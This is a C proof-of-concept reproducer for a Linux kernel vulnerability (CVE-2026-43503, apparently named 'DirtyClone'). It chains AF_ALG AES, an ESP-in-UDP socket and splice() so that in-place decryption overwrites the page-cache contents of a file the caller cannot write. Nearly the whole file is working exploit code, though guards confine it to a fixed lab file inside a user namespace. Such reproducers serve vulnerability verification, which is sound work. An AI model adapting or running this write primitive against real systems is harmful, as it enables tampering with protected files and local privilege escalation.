// SPDX-License-Identifier: MIT
/*
 * SG-2026-0023-PoC
 *
 * Fixed-target reproducer for CVE-2026-43503.  The program accepts no
 * arguments and operates only on the report lab fixture.  All helper logic is
 * embedded in this translation unit so the source builds as one file.
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <linux/udp.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#define DC_BLOCK_SIZE 16U
#define DC_TARGET_SIZE 4096
#define DC_ATTEMPTS 3U

struct dc_profile {
    const char *name;
    const char *target;
    uint16_t port;
    uint32_t spi;
    uint8_t original[DC_BLOCK_SIZE];
    uint8_t desired[DC_BLOCK_SIZE];
};

static const uint8_t dc_aes_key[DC_BLOCK_SIZE] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
};

static void dc_fail_errno(const char *operation)
{
    int saved_errno = errno;

    fprintf(stderr, "[-] %s: %s\n", operation, strerror(saved_errno));
    exit(1);
}

static void dc_fail(const char *reason)
{
    fprintf(stderr, "[-] %s\n", reason);
    exit(1);
}

static void dc_fail_short(const char *operation)
{
    errno = EIO;
    dc_fail_errno(operation);
}

static void dc_print_block(const char *label,
                           const uint8_t block[DC_BLOCK_SIZE])
{
    size_t i;

    printf("[*] %-7s ascii='", label);
    for (i = 0; i < DC_BLOCK_SIZE; i++) {
        unsigned char c = block[i];

        putchar(c >= 0x20 && c <= 0x7e ? c : '.');
    }
    printf("' hex=");
    for (i = 0; i < DC_BLOCK_SIZE; i++)
        printf("%02x", block[i]);
    putchar('\n');
}

static void dc_require_namespace(void)
{
    FILE *map;
    unsigned long inside, outside, length;

    map = fopen("/proc/self/uid_map", "re");
    if (map == NULL)
        dc_fail_errno("open uid_map");
    if (fscanf(map, "%lu %lu %lu", &inside, &outside, &length) != 3) {
        fclose(map);
        dc_fail("cannot parse uid_map");
    }
    if (fclose(map) != 0)
        dc_fail_errno("close uid_map");

    if (geteuid() != 0 || inside != 0 || outside != 1000 || length != 1)
        dc_fail("refusing execution outside uid 1000 -> namespace root mapping");

    printf("[*] uid_map=%lu:%lu:%lu euid=%lu (namespace only)\n",
           inside, outside, length, (unsigned long)geteuid());
}

static void dc_read_block(int fd, uint8_t block[DC_BLOCK_SIZE])
{
    size_t done = 0;

    while (done < DC_BLOCK_SIZE) {
        ssize_t n = pread(fd, block + done, DC_BLOCK_SIZE - done,
                          (off_t)done);

        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            dc_fail_short("read fixed target block");
        done += (size_t)n;
    }
}

static unsigned long dc_read_unsigned_file(const char *path)
{
    FILE *file;
    unsigned long value;

    file = fopen(path, "re");
    if (file == NULL)
        dc_fail_errno("open namespace overflow-id setting");
    if (fscanf(file, "%lu", &value) != 1) {
        fclose(file);
        dc_fail("cannot parse namespace overflow-id setting");
    }
    if (fclose(file) != 0)
        dc_fail_errno("close namespace overflow-id setting");
    return value;
}

static int dc_open_target(const struct dc_profile *profile,
                          uint8_t before[DC_BLOCK_SIZE])
{
    char resolved[PATH_MAX];
    struct stat st;
    int fd, write_fd;
    unsigned long overflow_uid, overflow_gid;

    if (realpath(profile->target, resolved) == NULL)
        dc_fail_errno("realpath fixed target");
    if (strcmp(resolved, profile->target) != 0)
        dc_fail("fixed target resolved to an unexpected path");

    fd = open(profile->target, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0)
        dc_fail_errno("open fixed target read-only");
    if (fstat(fd, &st) < 0)
        dc_fail_errno("fstat fixed target");
    overflow_uid = dc_read_unsigned_file("/proc/sys/kernel/overflowuid");
    overflow_gid = dc_read_unsigned_file("/proc/sys/kernel/overflowgid");
    if (!S_ISREG(st.st_mode) || st.st_uid != overflow_uid ||
        st.st_gid != overflow_gid ||
        st.st_nlink != 1 || st.st_size != DC_TARGET_SIZE ||
        (st.st_mode & 07777) != 0444)
        dc_fail("target must be unmapped-root regular/nlink=1/size=4096/mode=0444");

    dc_read_block(fd, before);
    if (memcmp(before, profile->original, DC_BLOCK_SIZE) != 0)
        dc_fail("fixed target does not contain the expected original block");

    errno = 0;
    write_fd = open(profile->target, O_WRONLY | O_CLOEXEC | O_NOFOLLOW);
    if (write_fd >= 0) {
        close(write_fd);
        dc_fail("negative control failed: O_WRONLY unexpectedly succeeded");
    }
    if (errno != EACCES)
        dc_fail_errno("negative-control O_WRONLY");

    printf("[+] negative control: ordinary O_WRONLY denied (%s)\n",
           strerror(errno));
    return fd;
}

static void dc_aes_ecb(uint32_t operation,
                       const uint8_t input[DC_BLOCK_SIZE],
                       uint8_t output[DC_BLOCK_SIZE])
{
    struct sockaddr_alg address = { .salg_family = AF_ALG };
    struct iovec iov = {
        .iov_base = (void *)input,
        .iov_len = DC_BLOCK_SIZE,
    };
    char control[CMSG_SPACE(sizeof(uint32_t))] = {0};
    struct msghdr message = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = control,
        .msg_controllen = sizeof(control),
    };
    struct cmsghdr *cmsg;
    int transform, operation_fd;
    ssize_t n;

    memcpy(address.salg_type, "skcipher", sizeof("skcipher"));
    memcpy(address.salg_name, "ecb(aes)", sizeof("ecb(aes)"));

    transform = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
    if (transform < 0)
        dc_fail_errno("AF_ALG socket");
    if (bind(transform, (struct sockaddr *)&address, sizeof(address)) < 0)
        dc_fail_errno("AF_ALG bind ecb(aes)");
    if (setsockopt(transform, SOL_ALG, ALG_SET_KEY,
                   dc_aes_key, sizeof(dc_aes_key)) < 0)
        dc_fail_errno("AF_ALG set key");

    operation_fd = accept4(transform, NULL, NULL, SOCK_CLOEXEC);
    if (operation_fd < 0)
        dc_fail_errno("AF_ALG accept");

    cmsg = CMSG_FIRSTHDR(&message);
    if (cmsg == NULL)
        dc_fail("AF_ALG control message allocation failed");
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(sizeof(operation));
    memcpy(CMSG_DATA(cmsg), &operation, sizeof(operation));

    do {
        n = sendmsg(operation_fd, &message, 0);
    } while (n < 0 && errno == EINTR);
    if (n != (ssize_t)DC_BLOCK_SIZE)
        dc_fail_short("AF_ALG submit block");

    do {
        n = recv(operation_fd, output, DC_BLOCK_SIZE, MSG_WAITALL);
    } while (n < 0 && errno == EINTR);
    if (n != (ssize_t)DC_BLOCK_SIZE)
        dc_fail_short("AF_ALG receive block");

    if (close(operation_fd) != 0 || close(transform) != 0)
        dc_fail_errno("close AF_ALG socket");
}

static void dc_make_ciphertext(const struct dc_profile *profile,
                               const uint8_t first_ciphertext[DC_BLOCK_SIZE],
                               uint8_t iv[DC_BLOCK_SIZE],
                               uint8_t final_ciphertext[DC_BLOCK_SIZE])
{
    uint8_t decrypted[DC_BLOCK_SIZE];
    uint8_t final_plaintext[DC_BLOCK_SIZE];
    uint8_t ecb_input[DC_BLOCK_SIZE];
    size_t i;

    dc_aes_ecb(ALG_OP_DECRYPT, first_ciphertext, decrypted);
    for (i = 0; i < DC_BLOCK_SIZE; i++)
        iv[i] = decrypted[i] ^ profile->desired[i];

    for (i = 0; i < DC_BLOCK_SIZE - 2; i++)
        final_plaintext[i] = (uint8_t)(i + 1);
    final_plaintext[DC_BLOCK_SIZE - 2] = DC_BLOCK_SIZE - 2;
    final_plaintext[DC_BLOCK_SIZE - 1] = IPPROTO_UDP;

    for (i = 0; i < DC_BLOCK_SIZE; i++)
        ecb_input[i] = final_plaintext[i] ^ first_ciphertext[i];
    dc_aes_ecb(ALG_OP_ENCRYPT, ecb_input, final_ciphertext);
}

static int dc_udp_socket(const struct dc_profile *profile)
{
    struct sockaddr_in address = {
        .sin_family = AF_INET,
        .sin_port = htons(profile->port),
    };
    int fd, one = 1, encap = UDP_ENCAP_ESPINUDP;

    if (inet_pton(AF_INET, "127.0.0.1", &address.sin_addr) != 1)
        dc_fail("inet_pton failed");

    fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (fd < 0)
        dc_fail_errno("UDP socket");
    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
        dc_fail_errno("setsockopt SO_REUSEADDR");
    if (setsockopt(fd, IPPROTO_UDP, UDP_ENCAP,
                   &encap, sizeof(encap)) < 0)
        dc_fail_errno("setsockopt UDP_ENCAP_ESPINUDP");
    if (bind(fd, (struct sockaddr *)&address, sizeof(address)) < 0)
        dc_fail_errno("bind fixed UDP socket");
    if (connect(fd, (struct sockaddr *)&address, sizeof(address)) < 0)
        dc_fail_errno("connect fixed UDP socket");
    return fd;
}

static void dc_splice_file_to_pipe(int file_fd, int pipe_write)
{
    off_t offset = 0;
    size_t done = 0;

    while (done < DC_BLOCK_SIZE) {
        ssize_t n = splice(file_fd, &offset, pipe_write, NULL,
                           DC_BLOCK_SIZE - done, 0);

        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            dc_fail_short("splice fixed target into pipe");
        done += (size_t)n;
    }
}

static void dc_splice_pipe_to_udp(int pipe_read, int udp_fd)
{
    size_t done = 0;

    while (done < DC_BLOCK_SIZE) {
        ssize_t n = splice(pipe_read, NULL, udp_fd, NULL,
                           DC_BLOCK_SIZE - done, SPLICE_F_MORE);

        if (n < 0 && errno == EINTR)
            continue;
        if (n <= 0)
            dc_fail_short("splice pipe into UDP socket");
        done += (size_t)n;
    }
}

static void dc_send_exact(int fd, const void *buffer, size_t length, int flags,
                          const char *operation)
{
    ssize_t n;

    do {
        n = send(fd, buffer, length, flags | MSG_NOSIGNAL);
    } while (n < 0 && errno == EINTR);
    if (n != (ssize_t)length)
        dc_fail_short(operation);
}

static void dc_fire_once(const struct dc_profile *profile, int target_fd,
                         const uint8_t first_ciphertext[DC_BLOCK_SIZE],
                         uint32_t sequence)
{
    struct {
        uint32_t spi;
        uint32_t sequence;
        uint8_t iv[DC_BLOCK_SIZE];
    } __attribute__((packed)) header;
    uint8_t final_ciphertext[DC_BLOCK_SIZE];
    int udp_fd, pipe_fd[2];

    memset(&header, 0, sizeof(header));
    header.spi = htonl(profile->spi);
    header.sequence = htonl(sequence);
    dc_make_ciphertext(profile, first_ciphertext,
                       header.iv, final_ciphertext);

    udp_fd = dc_udp_socket(profile);
    if (pipe2(pipe_fd, O_CLOEXEC) < 0)
        dc_fail_errno("pipe2");

    dc_send_exact(udp_fd, &header, sizeof(header), MSG_MORE,
                  "send fixed ESP header");
    dc_splice_file_to_pipe(target_fd, pipe_fd[1]);
    dc_splice_pipe_to_udp(pipe_fd[0], udp_fd);
    dc_send_exact(udp_fd, final_ciphertext, sizeof(final_ciphertext), 0,
                  "send fixed ESP final block");

    if (close(pipe_fd[0]) != 0 || close(pipe_fd[1]) != 0 ||
        close(udp_fd) != 0)
        dc_fail_errno("close trigger descriptors");
}

static int dc_run(const struct dc_profile *profile, int argc)
{
    struct utsname uts;
    uint8_t before[DC_BLOCK_SIZE], after[DC_BLOCK_SIZE];
    int target_fd;
    unsigned int attempt;

    if (argc != 1)
        dc_fail("fixed-target report program accepts no arguments");

    dc_require_namespace();
    if (uname(&uts) < 0)
        dc_fail_errno("uname");
    printf("[*] case=%s target=%s port=%u spi=0x%x\n",
           profile->name, profile->target, profile->port, profile->spi);
    printf("[*] kernel=%s machine=%s\n", uts.release, uts.machine);

    target_fd = dc_open_target(profile, before);
    dc_print_block("before", before);
    memcpy(after, before, sizeof(after));

    for (attempt = 1; attempt <= DC_ATTEMPTS; attempt++) {
        printf("[*] trigger attempt=%u\n", attempt);
        dc_fire_once(profile, target_fd, before, attempt);
        usleep(100000);
        dc_read_block(target_fd, after);
        if (memcmp(after, profile->desired, DC_BLOCK_SIZE) == 0 ||
            memcmp(after, profile->original, DC_BLOCK_SIZE) != 0)
            break;
    }

    dc_print_block("after", after);
    if (close(target_fd) != 0)
        dc_fail_errno("close fixed target");

    if (memcmp(after, profile->desired, DC_BLOCK_SIZE) == 0) {
        printf("[+] %s_RESULT=VULNERABLE: fixed page-cache block changed\n",
               profile->name);
        return 0;
    }
    if (memcmp(after, profile->original, DC_BLOCK_SIZE) == 0) {
        printf("[+] %s_RESULT=NOT_VULNERABLE: fixed page-cache block unchanged\n",
               profile->name);
        return 2;
    }

    printf("[-] %s_RESULT=INCONCLUSIVE: unexpected fixed block value\n",
           profile->name);
    return 1;
}


static const struct dc_profile sg_2026_0023_poc_profile = {
    .name = "SG-2026-0023-POC",
    .target = "/opt/dirtyclone-lab/target.bin",
    .port = 4600,
    .spi = 0x2000U,
    .original = {
        'O', 'R', 'I', 'G', 'I', 'N', 'A', 'L',
        '-', 'B', 'L', 'O', 'C', 'K', '!', '!',
    },
    .desired = {
        'D', 'I', 'R', 'T', 'Y', 'C', 'L', 'O',
        'N', 'E', '-', 'P', 'O', 'C', '!', '!',
    },
};

int main(int argc, char **argv)
{
    (void)argv;
    return dc_run(&sg_2026_0023_poc_profile, argc);
}
